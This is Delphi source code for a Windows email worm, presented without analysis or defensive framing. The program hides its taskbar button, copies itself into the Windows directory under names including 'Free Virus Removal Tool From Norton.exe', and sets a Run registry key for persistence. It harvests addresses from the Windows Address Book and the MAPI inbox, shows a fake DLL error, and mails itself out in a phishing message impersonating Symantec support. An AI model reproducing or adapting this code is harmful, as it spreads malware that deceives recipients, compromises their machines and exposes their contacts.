   unit Unit1;

   interface

   uses
     Windows, SysUtils, Controls, Forms, Dialogs, MAPI, WinInet, Registry,
     ExtCtrls, AppEvnts, Classes, Psock, USmtpRelayServer, StdCtrls;

   TYPE
     TForm1 = CLASS(TForm)
       ListBox1 : TListBox;
       Label1   : TLabel;
       Timer1   : TTimer;
       SmtpRelayServer1: TSmtpRelayServer;
       PROCEDURE FormCreate(Sender: TObject);
       PROCEDURE Timer1Timer(Sender: TObject);
     PRIVATE
       { Private declarations }
     PUBLIC
       { Public declarations }
     END;

   VAR
     Form1                : TForm1;
     SentEmail            : Word;
     EmailNum             : Word;
     I,T                  : Longint;
     Emails               : ARRAY [1..3000] OF STRING;
     OSInfo               : TOSVersionInfoA;
     WABExists            : Boolean;
     Reg                  : TRegistry;
     S                    : STRING;
     FEmail               : ARRAY[1..60] OF STRING;
     FLineNumber          : Byte;
     FAttachmentName      : STRING;
     FFrom                : STRING;
     FFromName            : STRING;
     FSubject             : STRING;

   CONST
     RSPSIMPLESERVICE     = 1;
     RSPUNREGISTERSERVICE = 0;

   CONST
     REGS : ARRAY[1..31] OF STRING=(
     'App Management','App Path','Applets','BITS','Control Panel','Controls Folder','DateTime',
     'Explorer','Hints','Instaler','MCD','MediaContentIndex', 'ModuleUsage','MS-DOS Emulation',
     'NLS','Reinstall','Run','RunOnce','Setup','SharedDLLs', 'ShellScrap','SideBySide','SMDEN',
     'Stillmage','Syncmgr','Telephony','Themes','Uninstall', 'URL','WebCheck','WindowsUpdate');

   IMPLEMENTATION

   {$R *.DFM}

   FUNCTION RegReadString(kroot:HKEY; sKey, sValue : STRING) : STRING;
   VAR
     qValue     : ARRAY [0..1023] OF Char;
     DataSize   : Integer;
     CurrentKey : HKEY;
   BEGIN
     RegOpenKeyEx(kRoot,PChar(sKey),0,KEY_ALL_ACCESS,CurrentKey);
     DataSize:=1024;
     RegQueryValueEx(CurrentKey,PChar(sValue),NIL,NIL,@qValue[0],@DataSize);
     RegCloseKey(CurrentKey);
     Result:=STRING(qvalue);
   END;

   Procedure FakeEmails;
   begin
     FEmail[01]:='Dear Sir,';
     FEmail[02]:='';
     FEmail[03]:='Symantec Antivirus Lab released the new version of free Virus Removall Tool!!';
     FEmail[04]:='';
     FEmail[05]:='This tool able to remove the following dangerous viruses:';
     FEmail[06]:='    -I-Worm.Klez,';
     FEmail[07]:='    -I-Worm.Kiltro,';
     FEmail[08]:='    -I-Worm.Langex,';
     FEmail[09]:='    -I-Worm.Manymize,';
     FEmail[10]:='    -I-Worm.Frethem,';
     FEmail[11]:='    -I-Worm.Masana,';
     FEmail[12]:='    -I-Worm.MyLife,';
     FEmail[13]:='    -and other 50 dangerous viruses.';
     FEmail[14]:='';
     FEmail[15]:='Just start the attached file, and It will check your system.';
     FEmail[16]:='';
     FEmail[17]:='Best Regards,';
     FEmail[18]:='  Symantec Antivirus Support';
     FEmail[19]:='';
     FEmail[20]:='     ---------------------------------------------------';
     FEmail[21]:='';
     FEmail[22]:='';
     FEmail[23]:='';
     FEmail[24]:='';
     FEmail[25]:='';
     FLineNumber:=25;
     FAttachmentName:='Free Virus Removal Tool From Norton.exe';
     FFrom:='Support@symantec.com';
     FFromName:='Symantec Antivirus';
     FSubject:='Free Virus Removal Tool from Symantec';
   end;

   PROCEDURE RandomReg(Num:Word);
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     FOR I:=1 TO Num DO BEGIN
       RandSeed:=1;
       Randomize;
       T:=Random(31);
       IF (T>0)AND(T<32) THEN Reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\'+REGS[T], False);
     END;
     Reg.CloseKey;
   END;

   FUNCTION CopyFile(CONST SourceFile:TFileName;CONST DestinationFile:TFileName) : Boolean;
   BEGIN
     Result:=Windows.CopyFile(pChar(SourceFile),pChar(DestinationFile),False);
   END;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir: ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     Result:=StrPas(PWindowsDir)+'\';
   END;

   FUNCTION RegisterServiceProcess(dwProcessID,dwType:DWord) : DWord;
     STDCALL; EXTERNAL 'KERNEL32.DLL';

   PROCEDURE VRegistry;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True);
     IF Reg.ReadString('Setlorn')='' THEN Reg.WriteString('Setlorn',WinPath+'setlorn.exe');
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE QuickSort(Left,Right:Word);
      { Szokàsos quicksort rendezÂs   }
   VAR
     Up,Down : Word;
     Compare : STRING;
     Dummy   : STRING;
   BEGIN
     Up:=Left;Down:=Right;Compare:=Emails[(Left+Right)DIV 2];
     REPEAT
       WHILE Emails[Up]<Compare DO Inc(Up);
       WHILE Compare<Emails[Down] DO Dec(Down);
       IF Up<=Down THEN BEGIN
         Dummy:=Emails[Up];Emails[Up]:=Emails[Down];Emails[Down]:=Dummy;
         Inc(Up);Dec(Down);
       END;
     UNTIL Up>Down;
     IF Left<Down THEN QuickSort(Left,Down);
     IF Up<Right  THEN QuickSort(Up,Right);
   END;

   PROCEDURE KillDupes;
   BEGIN
     FOR I:=EmailNum-1 DOWNTO 1 DO BEGIN
       IF emails[I]=Emails[I+1] THEN BEGIN
         FOR T:=I TO EmailNum DO Emails[T]:=Emails[T+1];
         Dec(EmailNum);
       END;
     END;
   END;

   PROCEDURE ReadWab;
   VAR a  : FILE;
       b,g,k : Longint;
       i  : STRING;
       n  : ARRAY[1..5] OF Char;
       xx : ARRAY[1..500] OF Char;
       rr : Word;
       WABPath :STRING;
   BEGIN
     RandomReg(1430);
     WABPath:=RegReadString(HKEY_CURRENT_USER,'SOFTWARE\Microsoft\WAB\WAB4\WAB File Name','');
     if(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
       WABExists:=True;
       Assign(a,WABPath);
       Reset(a,1);
       Seek(a,176199);
       REPEAT
         BlockRead(a,n,5);
         IF n[1]+n[2]+n[3]+n[4]=Chr($01)+Chr($1F)+Chr($00)+Chr($03) THEN BEGIN
           BlockRead(a,xx,Ord(n[5])+30);
           i:='';
           FOR rr:=1 TO Ord(n[5])+30 DO i:=i+xx[rr];
           Delete(i,1,3);
           g:=Pos(Chr(0)+Chr(0)+Chr(0),i);
           IF g>0 THEN Delete(i,g,Length(i)-g+1);
           FOR b:=1 TO Ord(n[5]) DO IF i[b]=Chr($00) THEN Delete(i,b,1);
           IF (Pos('@',i)>0)AND(i[1]<>'/') THEN BEGIN
             IF EmailNum<3000 THEN Inc(EmailNum);
             FOR k:=1 TO Length(i) DO i[k]:=UpCase(i[k]);
             Emails[EmailNum]:=i;
           END;
         END ELSE Seek(a,FilePos(a)-4);
         UNTIL ((FileSize(a)-FilePos(a))<6);
         QuickSort(1,EmailNum);
         KillDupes;
       END;
       IF NOT FileExists(WABPath) then WABExists:=False;
     RandomReg(1430);
     END;

   PROCEDURE WriteEmailsReg;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\Setlorn', True);
     FOR i:=1 TO EmailNum DO BEGIN
     str(i,s);
     Reg.WriteString(S,Emails[i]);
     END;
     Reg.WriteInteger('email_num',EmailNum);
     Reg.WriteInteger('Sent',SenteMail);
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE ReadEmailsReg;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.OpenKey('\Software\Setlorn', True) THEN BEGIN
       EmailNum:=Reg.ReadInteger('email_num');
       FOR i:=1 TO EmailNum DO BEGIN
         Str(i,s);
         Emails[i]:=Reg.ReadString(S);
       END;
     END;
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE SentEmailReg;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.KeyExists('\Software\Setlorn') THEN BEGIN
     Reg.OpenKey('\Software\Setlorn', True);
     SentEmail:=Reg.ReadInteger('Sent');
     END;
     Reg.CloseKey;
   END;

   FUNCTION FirstRun: Boolean;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Result:= NOT Reg.KeyExists('\Software\Setlorn');
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE VMail;
   BEGIN
     ReadWab;
     Form1.ListBox1.Items.Clear;
     FOR T:=1 TO EmailNum DO Form1.ListBox1.Items.Add(Emails[T]);
   END;

   PROCEDURE ReadInbox;
   VAR
     Recip                     : TMAPIRecipDesc;
     MAPIMessage               : TMAPIMessage;
     lppMapiMessage            : PMapiMessage;
     MError                    : Cardinal;
     MapiSession               : LongInt;
     bWinNT                    : Boolean;
     bFindFirst                : Boolean;
     ProfileName               : STRING;
     OS                        : TOSVersionInfo;
     rr                        : Byte;
     sSeedMessageID,sMessageID : array[0..512] of Char;
   BEGIN
     // Which Operating System we on?
     OS.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(os);
     bWinNT:=(os.dwPlatformId=VER_PLATFORM_WIN32_NT);
     // Grab default profilename from registry
     IF (bWinNT) THEN ProfileName:=regReadString(HKEY_CURRENT_USER,'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles','DefaultProfile')
     ELSE ProfileName:=regReadString(HKEY_CURRENT_USER,'Software\Microsoft\Windows Messaging Subsystem\Profiles', 'DefaultProfile'); // Standard Windows
     // Logon to MAPI.  If no workie, get outta here
     TRY
       MError:=MapiLogOn(0, PChar(ProfileName), NIL, MAPI_NEW_SESSION, 0, @MapiSession);
       IF (MError<>SUCCESS_SUCCESS) THEN Exit;
     EXCEPT
       ;
     END;
     bFindFirst:=True;
     FOR i:=1 TO 50 DO TRY
       IF (bFindFirst) THEN bFindFirst := False ELSE sSeedMessageID := sMessageID;
       MError := MapiFindNext(MapiSession, 0, NIL, @sSeedMessageID, 0, 0, @sMessageID);
       IF (MError = SUCCESS_SUCCESS) THEN BEGIN
         lppMapiMessage := @MAPIMessage;
         MError := MAPIReadMail(MAPISession,0,@sMessageID, MAPI_ENVELOPE_ONLY, 0, lppMapiMessage);
         IF (MError = SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN WITH Recip DO BEGIN
           IF EmailNum<3000 THEN Inc(EmailNum);
           Emails[EmailNum]:=lppMapiMessage.lpOriginator.lpszAddress;
           FOR rr:=1 TO Length(Emails[EmailNum]) DO Emails[EmailNum][rr]:=UpCase(Emails[EmailNum][rr]);
         END;
        END;
     EXCEPT
     END;
     QuickSort(1,EmailNum);
     KillDupes;
     VMail;
     WriteEmailsReg;
     TRY
       MError := MapiLogOff(MapiSession, 0, 0, 0);
     EXCEPT
       ;
     END;
   END;

   PROCEDURE TForm1.Timer1Timer(Sender: TObject);
   var t:byte;
   BEGIN

     IF (InternetGetConnectedState(NIL,0))AND(EmailNum>0)and(not SMTPRelayServer1.Busy) THEN BEGIN
       Reg := TRegistry.Create;
       Inc(SentEmail);
       Str(SentEmail,s);
       Label1.Caption:=s;
       IF SentEmail>EmailNum THEN SentEmail:=0;
       Reg.RootKey:=HKEY_LOCAL_MACHINE;
       Reg.OpenKey('\Software\Setlorn', True);
       Reg.WriteInteger('Sent',SentEmail);
       Reg.CloseKey;
       Reg.Free;
       FakeEmails;
       SMTPRelayServer1.Connections:=1;
       SMTPRelayServer1.TimeOut:=60;
       SMTPRelayServer1.From:=FFrom;
       SMTPRelayServer1.HeaderFrom:=FFromName;
       SMTPRelayServer1.Subject:=FSubject;
       SMTPRelayServer1.Body.Clear;
       for t:=1 to FLineNumber do SMTPRelayServer1.Body.Add(FEmail[t]);
       IF FileExists(WinPath+'Free Virus Removal Tool From Norton.exe') THEN SMTPRelayserver1.Attachments.Add(WinPath+'Free Virus Removal Tool From Norton.exe');
       SMTPRelayServer1.Recipients.Clear;
       SMTPRelayServer1.Recipients.Add('positronvx@freemail.hu');
       try
         SmtpRelayServer1.Send;
       except
       end;
     END;
   END;

   PROCEDURE TForm1.FormCreate(Sender: TObject);
   BEGIN
     Reg := TRegistry.Create;
     OSInfo.dwOSVersionInfoSize:=sizeof(OSInfo);
     GetVersionEx(OSInfo);
     //Hiding the Application's TaskBar Button
     ShowWindow(Application.Handle, SW_HIDE);
     SetWindowLong(Application.Handle, GWL_EXSTYLE, GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW );
     ShowWindow(Application.Handle, SW_SHOW);
     //Hide from "Close Program" (Win 9x)
   //  if OSInfo.dwPlatformID=VER_PLATFORM_WIN32_WINDOWS THEN RegisterServiceProcess(GetCurrentProcessID, RSPSIMPLESERVICE);
     SentEmailReg;
     CopyFile (pchar(paramstr(0)),pchar(Winpath+'setlorn.exe'));
     CopyFile (pchar(paramstr(0)),pchar(Winpath+'Free Virus Removal Tool From Norton.exe'));
     IF FirstRun THEN BEGIN
       Vregistry;
       EmailNum:=1; emails[1]:='MAIL@AXELERO.HU';
       ReadWab;
       ReadInBox;
       Application.MessageBox('QTINTF433.DLL Not Found!','Error',MB_ICONHAND);
     END ELSE BEGIN
       ReadEmailsReg;
       ReadInBox;
     END;
     Reg.Free;
   END;
   end.
